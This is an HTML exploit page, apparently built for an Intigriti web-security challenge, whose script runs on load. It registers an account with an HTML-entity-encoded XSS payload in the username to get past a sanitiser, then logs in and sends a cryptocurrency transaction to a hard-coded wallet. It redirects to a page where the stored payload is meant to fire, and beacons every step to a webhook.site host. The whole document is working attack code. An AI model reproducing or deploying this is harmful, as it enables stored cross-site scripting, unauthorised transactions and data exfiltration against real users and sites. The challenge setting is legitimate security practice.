<!DOCTYPE html>
<html>
<head><title>XSS Exploit - HTML Entities</title></head>
<body>
<h1>XSS Exploit - HTML Entity Bypass</h1>
<div id="log"></div>

<script>
const TARGET = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/c3f7958b-f7cc-4f87-97ac-4de6830c2b42';
const WALLET = '16472226db03703a192aa383237035a69f';

let step = 0;

function log(msg) {
    step++;
    document.getElementById('log').innerHTML += '<div>[' + step + '] ' + msg + '</div>';
    console.log('[' + step + '] ' + msg);
    new Image().src = WEBHOOK + '/?s=' + step + '&m=' + encodeURIComponent(msg) + '&ts=' + Date.now();
}

async function exploit() {
    log('Starting XSS exploit with HTML entities...');

    // HTML entity XSS payload - bypasses sanitizePayloadString()
    const XSS_USER = 'xss_' + Date.now().toString().slice(-6) + '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;';

    try {
        // Register
        log('Registering: ' + XSS_USER.substring(0, 50) + '...');
        const reg = await fetch(TARGET + '/api/register', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: XSS_USER,
                password: 'Test123!'
            })
        });

        const regData = await reg.json();
        log('Register: ' + reg.status);

        if (reg.ok) {
            // Login
            log('Logging in...');
            const login = await fetch(TARGET + '/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                credentials: 'include',
                body: JSON.stringify({
                    username: XSS_USER,
                    password: 'Test123!'
                })
            });

            const loginData = await login.json();
            log('Login: ' + login.status);

            if (login.ok) {
                // Transaction
                log('Making transaction...');
                const tx = await fetch(TARGET + '/api/transaction', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: WALLET,
                        currency: '1337COIN',
                        amount: 1
                    })
                });

                log('Transaction: ' + tx.status);

                // Alert
                alert('gigawatz');
                log('Alert triggered');

                // Redirect to marketwatch - XSS executes when nickname is rendered
                setTimeout(() => {
                    log('Redirecting to marketwatch...');
                    window.location.href = TARGET + '/marketwatch.html';
                }, 3000);
            }
        } else {
            log('Register failed: ' + JSON.stringify(regData));
        }

    } catch (e) {
        log('Error: ' + e.message);
    }
}

setTimeout(exploit, 1000);
</script>
</body>
</html>
